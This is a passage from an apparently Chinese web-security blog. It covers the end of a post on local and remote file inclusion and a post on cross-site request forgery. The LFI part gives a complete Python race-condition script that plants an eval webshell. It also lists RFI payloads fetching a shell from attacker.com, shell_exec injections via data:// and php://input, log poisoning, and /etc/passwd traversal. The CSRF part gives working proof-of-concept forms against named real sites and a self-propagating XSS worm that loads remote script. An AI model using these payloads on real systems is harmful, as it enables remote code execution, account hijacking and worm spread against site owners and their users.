class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding=utf-8</span><br><span class="line"># Author : idwar</span><br><span class="line"># http://secer.org</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">可能需要你改的几个地方：</span><br><span class="line">1、host</span><br><span class="line">2、port</span><br><span class="line">3、request中的phpinfo页面名字及路径</span><br><span class="line">4、hello_lfi() 函数中的url，即存在lfi的页面和参数</span><br><span class="line">5、如果不成功或报错，尝试增加padding长度到7000、8000试试</span><br><span class="line">6、某些开了magic_quotes_gpc或者其他东西不能%00的，自行想办法截断并在（4）的位置对应修改</span><br><span class="line"> Good Luck :)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">import urllib2</span><br><span class="line">import hashlib</span><br><span class="line">from socket import *</span><br><span class="line">from time import sleep</span><br><span class="line">host = &#x27;192.168.92.132&#x27;</span><br><span class="line">#host = gethostbyname(domain)</span><br><span class="line">port = 80</span><br><span class="line">shell_name = hashlib.md5(host).hexdigest() + &#x27;.php&#x27;</span><br><span class="line">pattern = re.compile(r&#x27;&#x27;&#x27;\[tmp_name\]\s=&amp;gt;\s(.*)\W*error]&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">payload = &#x27;&#x27;&#x27;idwar&lt;?php fputs(fopen(&#x27;./&#x27;&#x27;&#x27; + shell_name + &#x27;&#x27;&#x27;\&#x27;,&quot;w&quot;),&quot;idwar was here&lt;?php eval(\$_POST[a]);?&gt;&quot;)?&gt;\r&#x27;&#x27;&#x27;</span><br><span class="line">req = &#x27;&#x27;&#x27;-----------------------------7dbff1ded0714\r</span><br><span class="line">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span><br><span class="line">Content-Type: text/plain\r</span><br><span class="line">\r</span><br><span class="line">%s</span><br><span class="line">-----------------------------7dbff1ded0714--\r&#x27;&#x27;&#x27; % payload</span><br><span class="line"></span><br><span class="line">padding=&#x27;A&#x27; * 8000</span><br><span class="line">request=&#x27;&#x27;&#x27;POST /test/1.php?a=&#x27;&#x27;&#x27;+padding+&#x27;&#x27;&#x27; HTTP/1.0\r</span><br><span class="line">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&#x27;&#x27;&#x27;+padding+&#x27;&#x27;&#x27;\r</span><br><span class="line">HTTP_ACCEPT: &#x27;&#x27;&#x27; + padding + &#x27;&#x27;&#x27;\r</span><br><span class="line">HTTP_USER_AGENT: &#x27;&#x27;&#x27; + padding + &#x27;&#x27;&#x27;\r</span><br><span class="line">HTTP_ACCEPT_LANGUAGE: &#x27;&#x27;&#x27; + padding + &#x27;&#x27;&#x27;\r</span><br><span class="line">HTTP_PRAGMA: &#x27;&#x27;&#x27; + padding + &#x27;&#x27;&#x27;\r</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span><br><span class="line">Content-Length: %s\r</span><br><span class="line">Host: %s\r</span><br><span class="line">\r</span><br><span class="line">%s&#x27;&#x27;&#x27; % (len(req), host, req)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def hello_lfi():</span><br><span class="line">    while 1:</span><br><span class="line">        s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">        s.connect((host, port))</span><br><span class="line">        s.send(request)</span><br><span class="line">        data = &#x27;&#x27;</span><br><span class="line">        while r&#x27;&lt;/body&gt;&lt;/html&gt;&#x27; not in data:</span><br><span class="line">            data = s.recv(9999)</span><br><span class="line">            search_ = re.search(pattern, data)</span><br><span class="line">            if search_:</span><br><span class="line">                tmp_file_name = search_.group(1)</span><br><span class="line">                url = r&#x27;http://192.168.92.132/test/2.php?s=%s%%00&#x27; % tmp_file_name</span><br><span class="line">                print url</span><br><span class="line">                search_request = urllib2.Request(url)</span><br><span class="line">                search_response = urllib2.urlopen(search_request)</span><br><span class="line">                html_data = search_response.read()</span><br><span class="line">                if &#x27;idwar&#x27; in html_data:</span><br><span class="line">                    s.close()</span><br><span class="line">                    return &#x27;\nDone. Your webshell is : \n\n%s\n&#x27; % (&#x27;http://&#x27; + host + &#x27;/&#x27; + shell_name)</span><br><span class="line">                    #import sys;sys.exit()</span><br><span class="line">        s.close()</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print hello_lfi()</span><br><span class="line">    print &#x27;\n Good Luck :)&#x27;</span><br></pre></td></tr></table></figure>



<h4 id="10-Logs"><a href="#10-Logs" class="headerlink" title="10) Logs"></a>10) Logs</h4><p><code>包含web server日志文件</code></p>
<p>不管我们提交的Get请求或者Post请求都会被apache记录到日志文件里。所以我们可以控制请求内容，将恶意代码写入日志文件，从而实现包含。</p>
<p>直接访问<code>test.php?file=../&lt;?php phpinfo();?&gt;.php</code>，将会被记录下来。这样便成功将php代码写进log文件。</p>
<p><code>FTP日志文件内容</code></p>
<p>用户名填：<code>&lt;?php phpinfo();?&gt;</code></p>
<h3 id="Remote-File-Inclusion"><a href="#Remote-File-Inclusion" class="headerlink" title="Remote File Inclusion"></a>Remote File Inclusion</h3><p>Works when allow_url_include in php.ini is set to TRUE</p>
<h4 id="1-Direct-Remote-Include"><a href="#1-Direct-Remote-Include" class="headerlink" title="1) Direct Remote Include"></a>1) Direct Remote Include</h4><p>Including php file in text format directly</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/lfi.hpp?page=http://attacker.com/shell.txt</span><br></pre></td></tr></table></figure>

<h4 id="2-Data-text-plain"><a href="#2-Data-text-plain" class="headerlink" title="2) Data:text/plain"></a>2) Data:text/plain</h4><p>Including php code through data stream</p>
<p>data://伪协议 &gt;&gt; 数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/lfi.php?page=data:text/plain;,&lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">http://www.site.com/lfi.php?page=data:text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7Pz4=</span><br></pre></td></tr></table></figure>

<h4 id="3-php-input"><a href="#3-php-input" class="headerlink" title="3) php://input"></a>3) php://input</h4><p>?file=php://input 数据利用POST传过去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /lfi.php?page=php://input&amp;cmd=cd HTTP/1.1</span><br><span class="line">Host: www.site.com</span><br><span class="line">Content-Lenth: 39</span><br><span class="line"></span><br><span class="line">&lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Fighting-with-extensions"><a href="#Fighting-with-extensions" class="headerlink" title="Fighting with extensions"></a>Fighting with extensions</h3><h4 id="1-Null-Bytes"><a href="#1-Null-Bytes" class="headerlink" title="1) Null Bytes"></a>1) Null Bytes</h4><p>Add null byte that will terminate string</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/lfi.php?page=/etc/passwd%00</span><br><span class="line"></span><br><span class="line">http://www.site.com/lfi.php?page=/etc/passwd%2500</span><br></pre></td></tr></table></figure>

<h4 id="2-Truncation"><a href="#2-Truncation" class="headerlink" title="2) Truncation"></a>2) Truncation</h4><p>Cut extension by creating long string</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/lfi.php?page=../../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/lfi.php?page=/etc/passwd..............................</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/lfi.php?page=/etc/passwd.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\</span><br></pre></td></tr></table></figure>







<p>参考：</p>
<p><a class="link" target="_blank" rel="noopener" href="http://www.2cto.com/article/201301/184439.html">利用本地包含漏洞执行任意代码<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" target="_blank" rel="noopener" href="https://github.com/lucyoa/ctf-wiki/blob/master/web/file-inclusion/README.md">CTF-WIKI<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" target="_blank" rel="noopener" href="https://github.com/L4oZu1/LFIboomCTF">LFIboomCTF<i class="fas fa-external-link-alt"></i></a></p>

                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Sat Nov 12 2016 21:00:00 GMT+0800">2016-11-12</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/">安全技术</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/tags/Web/">Web</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/Local%20File%20Inclusion%20and%20Remote%20File%20Inclusion/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/Cross-site%20request%20forgery/">
                        Cross-site request forgery
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        0x00 什么是CSRFCSRF：Cross-Site Request Forgery，跨站请求伪造
在OWASP中是这样说的
12一个跨站请求伪造攻击迫使登录用户的浏览器将伪造的HTTP请求,包括该用户的会话cookie和其他认证信息,发送到一个存在漏洞的web应用程序。这就允许了攻击者迫使用户浏览器向存在漏洞的应用程序发送请求,而这些请求会被应用程序认为是用户的合法请求

0x01 CSRF攻击分类
GET

1请求是个GET请求，请求中没有token验证和referer验证，然后还有一个固定的变量可以被控制


POST

1请求是个POST请求，请求中没有token参数，也没有验证referer


POST-&gt;GET

1请求是个POST请求，请求中没有token参数，但是验证了referer。然而可以将post请求改写为get请求，然后通过第一种的情况进行利用


CSRF+XSS

1传说中的“黄金搭档”


FLASH CSRF

123Flash跨域权限管理文件过滤规则不严(domain=”*”)，导致可以从其它任何域传Flash产生CSRF说真的，在学习这个之前还真不知道crossdomain.xml这个文件的作用

0x02 CSRF的主要危害
篡改目标网站上的用户数据

盗取用户隐私数据

作为其他攻击向量的辅助攻击手法

传播CSRF蠕虫


0x03 CSRF案例解析
华为商城某处CSRF可修改安全邮箱

漏洞点http://www.vmall.com/member/updateEmail.json?email=xxxx@xxx.com


然后就可以修改绑定邮箱，然后通过邮箱修改密码，登录帐号

新浪微博CSRF点链接关注


这里uid可以是任意用户
利用burp简单构造poc
1234&lt;form action=&quot;http://movie.weibo.com/feed/relation/index/?fajtype=follow&quot; method=&quot;POST&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;uid&quot; value=&quot;1944519257&quot; /&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;&lt;/form&gt;



新浪微博CSRF之点我链接发微博



http://wanwan.sina.com.cn.llunull.tk/a.php
此处构造poc
1234567&lt;form action=&quot;http://wanwan.sina.com.cn/t_sina/event/sxd.php&quot; method=&quot;get&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;e&quot; value=&quot;5&quot; /&gt;&lt;input type=&quot;text&quot; name=&quot;img&quot; value=&quot;http://wanwan.sina.com.cn.llunull.tk/sina_csrf.php&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;text&quot; value=&quot;hello,[email protected]://wanwan.sina.com.cn.llunull.tk/a.php&quot; /&gt;&lt;input type=&quot;text&quot; name=&quot;ra&quot; value=&quot;&quot;&gt;&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;&lt;/form&gt;




某通用cms添加后台管理员的CSRF漏洞

添加后台管理员请求如下：

然后将post请求改成get也可以成功发包。
http://127.0.0.1/asp/Survey/admin/Admin.asp?Username=test222&amp;Password1=123456&amp;Password2=123456&amp;action=yes

万达电影主站xss+csrf又是蠕虫

电影的评论处存在存储型xss
payload：&lt;img src=x onerror=$[&#39;get\123cript&#39;](&#39;//20.rs&#39;) width=0&gt;

CSRF的蠕虫代码
1234567891011var url=&quot;http://www.wandafilm.com/user/comment.do?m=addFilmComment&quot;;var sendata = &quot;filmId=20140507033232512405&amp;commentContent=%3Cimg+src%3Dx+onerror%3D%24%5B&#x27;get\\123cript&#x27;%5D(&#x27;%2F%2Fkm3.pw&#x27;)+width%3D0%3E&amp;cmType=0&amp;code=&quot;;if (window.XMLHttpRequest)&#123;var xmlhttp1=new XMLHttpRequest();&#125;else&#123;var xmlhttp1=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);&#125;xmlhttp1.open(&quot;POST&quot;,url,true);xmlhttp1.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp1.send(sendata);
filmId是想要蔓延过去的电影ID的值，只需要改变电影ID就可以实现蠕虫的蔓延，当然这只是测试了

百度某站可结合CSRF及XSS劫持账号

在百度词典-我的词典处，有将生词添加进生词本的功能，在备注的时候没有进行过滤，可以直接插入JavaScript代码。
一个“SELF-XSS”,只能跨自己，有什么用呢？
考虑利用CSRF来触发这个XSS
构造POC：
1234567891011121314151617#!html&lt;html&gt;&lt;head&gt;    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;form id=&quot;baidu&quot; name=&quot;baidu&quot; action=&quot;http://dict.baidu.com/wordlist.php&quot; method=&quot;POST&quot;&gt;        &lt;input type=&quot;text&quot; name=&quot;req&quot; value=&quot;add&quot; /&gt;        &lt;input type=&quot;text&quot; name=&quot;word&quot; value=&quot;Wooyun&quot; /&gt;        &lt;input type=&quot;text&quot; name=&quot;explain&quot; value=&quot;&lt;script src=http://xsserme&gt;&lt;/script&gt;&quot; /&gt;        &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;    &lt;/form&gt;    &lt;script&gt;        document.baidu.submit();    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;
诱惑受害者访问该页面
已经成功添加了一个新单词“Wooyun”
代码成功执行
[来源wooyun]

flash csrf自动设置自己的密保邮箱

当一个访客访问伪造链接的时候，自动设置自己的密保邮箱。
申请保密邮箱，浏览器向服务端发送了一个POST请求，请求地址和参数为：POST:xxx.xxx.xx/xx.jsp?userid=xxxx&amp;mail=dddd@dddd.com
之前测试保密邮箱得知服务端没有验证Referer，但是页面验证了Token，所以就可以直接把POST数据包中的请求地址，参数名，参数值，Token值取出来用于伪造绑定保密邮箱的请求。
利用代码：
12345678910111213141516171819202122232425262728293031323334353637#!as3package &#123;    import flash.display.Sprite;    import flash.events.Event;    import flash.net.*;    import flash.text.TextField;    public class url extends Sprite    &#123;        public function url()        &#123;            //获取当前页面userid/token            var echo_txt:TextField = new TextField();            var targetURL:String = &quot;http://xx.xx.cc&quot;;            var request:URLRequest = new URLRequest(targetURL);            request.method = URLRequestMethod.GET;            request.data = &quot;&quot;;            sendToURL(request);            var loader:URLLoader=new URLLoader();            loader.addEventListener(Event.COMPLETE,completeHandler);            function completeHandler(event:Event):void&#123;            var userid:String=((loader.data+&quot;&quot;).match(/\/xxxx\/mxxxx\.php\?xxid=(\d+)/)||[&quot;&quot;,&quot;&quot;])[1]; var masthash:String=((loader.data+&quot;&quot;).match(/\/xxxx\/mxxxx\.php\?masthash=(\d+)/)||[&quot;&quot;,&quot;&quot;])[1];            echo_txt.text =  masthash;            //伪造申请密保邮箱POST请求            var emailtargetURL:String = &quot;http://xxxxxx.xx.cc/xxxx/xxxx.jsp?mark=send&quot;;            var emailrequest:URLRequest = new URLRequest(emailtargetURL);            emailrequest.method = URLRequestMethod.POST;            var postdata:Object = new Array();            postdata[0]=&quot;xxxx=xxxx@xxx.cc&amp;xxxx=&quot;+xxxxx&amp;&quot;xxxxx=&quot;+xxx;            emailrequest.data = postdata[0];            sendToURL(emailrequest);            &#125;            loader.load(request);        &#125;    &#125;&#125;

现在可以注册一个新邮箱测试一下了
[来源wooyun]
0x04 CSRF的防御token校验
0x05 CSRF总结只要够猥琐，一个小洞也能上天

                    
                </div> -->
                <div class="article-content markdown-body">
                    <h3 id="0x00-什么是CSRF"><a href="#0x00-什么是CSRF" class="headerlink" title="0x00 什么是CSRF"></a>0x00 什么是CSRF</h3><p>CSRF：<code>Cross-Site Request Forgery，跨站请求伪造</code></p>
<p>在OWASP中是这样说的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一个跨站请求伪造攻击迫使登录用户的浏览器将伪造的HTTP请求,包括该用户的会话cookie</span><br><span class="line">和其他认证信息,发送到一个存在漏洞的web应用程序。这就允许了攻击者迫使用户浏览器向存在漏洞的应用程序发送请求,而这些请求会被应用程序认为是用户的合法请求</span><br></pre></td></tr></table></figure>

<h3 id="0x01-CSRF攻击分类"><a href="#0x01-CSRF攻击分类" class="headerlink" title="0x01 CSRF攻击分类"></a>0x01 CSRF攻击分类</h3><ul>
<li>GET</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请求是个GET请求，请求中没有token验证和referer验证，然后还有一个固定的变量可以被控制</span><br></pre></td></tr></table></figure>

<ul>
<li>POST</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请求是个POST请求，请求中没有token参数，也没有验证referer</span><br></pre></td></tr></table></figure>

<ul>
<li>POST-&gt;GET</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请求是个POST请求，请求中没有token参数，但是验证了referer。然而可以将post请求改写为get请求，然后通过第一种的情况进行利用</span><br></pre></td></tr></table></figure>

<ul>
<li>CSRF+XSS</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传说中的“黄金搭档”</span><br></pre></td></tr></table></figure>

<ul>
<li>FLASH CSRF</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Flash跨域权限管理文件过滤规则不严(domain=”*”)，导致可以从其它任何域传Flash产生CSRF</span><br><span class="line"></span><br><span class="line">说真的，在学习这个之前还真不知道crossdomain.xml这个文件的作用</span><br></pre></td></tr></table></figure>

<h3 id="0x02-CSRF的主要危害"><a href="#0x02-CSRF的主要危害" class="headerlink" title="0x02 CSRF的主要危害"></a>0x02 CSRF的主要危害</h3><ul>
<li><p>篡改目标网站上的用户数据</p>
</li>
<li><p>盗取用户隐私数据</p>
</li>
<li><p>作为其他攻击向量的辅助攻击手法</p>
</li>
<li><p>传播CSRF蠕虫</p>
</li>
</ul>
<h3 id="0x03-CSRF案例解析"><a href="#0x03-CSRF案例解析" class="headerlink" title="0x03 CSRF案例解析"></a>0x03 CSRF案例解析</h3><ul>
<li><h4 id="华为商城某处CSRF可修改安全邮箱"><a href="#华为商城某处CSRF可修改安全邮箱" class="headerlink" title="华为商城某处CSRF可修改安全邮箱"></a>华为商城某处CSRF可修改安全邮箱</h4></li>
</ul>
<p>漏洞点<code>http://www.vmall.com/member/updateEmail.json?email=xxxx@xxx.com</code></p>
<p><img lazyload src="/images/loading.svg" data-src="15190486321450.jpg"></p>
<p><img lazyload src="/images/loading.svg" data-src="15190486387105.jpg"></p>
<p>然后就可以修改绑定邮箱，然后通过邮箱修改密码，登录帐号</p>
<ul>
<li><h4 id="新浪微博CSRF点链接关注"><a href="#新浪微博CSRF点链接关注" class="headerlink" title="新浪微博CSRF点链接关注"></a>新浪微博CSRF点链接关注</h4></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="15190486493770.jpg"></p>
<p>这里uid可以是任意用户</p>
<p>利用burp简单构造poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://movie.weibo.com/feed/relation/index/?fajtype=follow&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;uid&quot; value=&quot;1944519257&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>


<ul>
<li><h4 id="新浪微博CSRF之点我链接发微博"><a href="#新浪微博CSRF之点我链接发微博" class="headerlink" title="新浪微博CSRF之点我链接发微博"></a>新浪微博CSRF之点我链接发微博</h4></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="15190486616930.jpg"></p>
<p><img lazyload src="/images/loading.svg" data-src="15190486683177.jpg"></p>
<p><a class="link" target="_blank" rel="noopener" href="http://wanwan.sina.com.cn.llunull.tk/a.php">http://wanwan.sina.com.cn.llunull.tk/a.php<i class="fas fa-external-link-alt"></i></a></p>
<p>此处构造poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://wanwan.sina.com.cn/t_sina/event/sxd.php&quot; method=&quot;get&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;e&quot; value=&quot;5&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;img&quot; value=&quot;http://wanwan.sina.com.cn.llunull.tk/sina_csrf.php&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;text&quot; value=&quot;hello,[email protected]://wanwan.sina.com.cn.llunull.tk/a.php&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;ra&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>



<ul>
<li><h4 id="某通用cms添加后台管理员的CSRF漏洞"><a href="#某通用cms添加后台管理员的CSRF漏洞" class="headerlink" title="某通用cms添加后台管理员的CSRF漏洞"></a>某通用cms添加后台管理员的CSRF漏洞</h4></li>
</ul>
<p>添加后台管理员请求如下：</p>
<p><img lazyload src="/images/loading.svg" data-src="15190486758847.png"></p>
<p>然后将post请求改成get也可以成功发包。</p>
<p><code>http://127.0.0.1/asp/Survey/admin/Admin.asp?Username=test222&amp;Password1=123456&amp;Password2=123456&amp;action=yes</code></p>
<ul>
<li><h4 id="万达电影主站xss-csrf又是蠕虫"><a href="#万达电影主站xss-csrf又是蠕虫" class="headerlink" title="万达电影主站xss+csrf又是蠕虫"></a>万达电影主站xss+csrf又是蠕虫</h4></li>
</ul>
<p>电影的评论处存在存储型xss</p>
<p>payload：<code>&lt;img src=x onerror=$[&#39;get\123cript&#39;](&#39;//20.rs&#39;) width=0&gt;</code></p>
<p><img lazyload src="/images/loading.svg" data-src="15190487212173.png"></p>
<p>CSRF的蠕虫代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var url=&quot;http://www.wandafilm.com/user/comment.do?m=addFilmComment&quot;;</span><br><span class="line">var sendata = &quot;filmId=20140507033232512405&amp;commentContent=%3Cimg+src%3Dx+onerror%3D%24%5B&#x27;get\\123cript&#x27;%5D(&#x27;%2F%2Fkm3.pw&#x27;)+width%3D0%3E&amp;cmType=0&amp;code=&quot;;</span><br><span class="line">if (window.XMLHttpRequest)&#123;</span><br><span class="line">var xmlhttp1=new XMLHttpRequest();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">var xmlhttp1=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp1.open(&quot;POST&quot;,url,true);</span><br><span class="line">xmlhttp1.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp1.send(sendata);</span><br></pre></td></tr></table></figure>
<p>filmId是想要蔓延过去的电影ID的值，只需要改变电影ID就可以实现蠕虫的蔓延，当然这只是测试了</p>
<ul>
<li><h4 id="百度某站可结合CSRF及XSS劫持账号"><a href="#百度某站可结合CSRF及XSS劫持账号" class="headerlink" title="百度某站可结合CSRF及XSS劫持账号"></a>百度某站可结合CSRF及XSS劫持账号</h4></li>
</ul>
<p>在百度词典-我的词典处，有将生词添加进生词本的功能，在备注的时候没有进行过滤，可以直接插入JavaScript代码。</p>
<p>一个“SELF-XSS”,只能跨自己，有什么用呢？</p>
<p>考虑利用CSRF来触发这个XSS</p>
<p>构造POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form id=&quot;baidu&quot; name=&quot;baidu&quot; action=&quot;http://dict.baidu.com/wordlist.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;req&quot; value=&quot;add&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;word&quot; value=&quot;Wooyun&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;explain&quot; value=&quot;&lt;script src=http://xsserme&gt;&lt;/script&gt;&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        document.baidu.submit();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>诱惑受害者访问该页面</p>
<p>已经成功添加了一个新单词“Wooyun”</p>
<p>代码成功执行</p>
<p>[来源wooyun]</p>
<ul>
<li><h4 id="flash-csrf自动设置自己的密保邮箱"><a href="#flash-csrf自动设置自己的密保邮箱" class="headerlink" title="flash csrf自动设置自己的密保邮箱"></a>flash csrf自动设置自己的密保邮箱</h4></li>
</ul>
<p>当一个访客访问伪造链接的时候，自动设置自己的密保邮箱。</p>
<p>申请保密邮箱，浏览器向服务端发送了一个POST请求，请求地址和参数为：<code>POST:xxx.xxx.xx/xx.jsp?userid=xxxx&amp;mail=dddd@dddd.com</code></p>
<p>之前测试保密邮箱得知服务端没有验证Referer，但是页面验证了Token，所以就可以直接把POST数据包中的请求地址，参数名，参数值，Token值取出来用于伪造绑定保密邮箱的请求。</p>
<p>利用代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!as3</span><br><span class="line">package &#123;</span><br><span class="line">    import flash.display.Sprite;</span><br><span class="line">    import flash.events.Event;</span><br><span class="line">    